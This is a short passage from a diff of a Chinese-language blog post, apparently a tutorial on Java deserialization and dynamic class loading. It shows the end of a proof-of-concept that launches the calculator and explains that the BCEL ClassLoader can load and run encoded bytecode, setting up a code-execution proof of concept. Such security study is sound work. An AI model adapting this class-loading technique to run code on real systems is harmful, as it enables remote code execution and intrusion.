class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125; <span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这样子的代码是可以成功弹计算器了，但是我们发现有一堆乱码，处理一下。</p>
-
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/BCELRce.png" class>
 
 <p>这一堆特殊的代码，BCEL ClassLoader 正是用于加载这串特殊的“字节码”，并可以执行其中的代码。我们修改一下 POC</p>
 <ul>
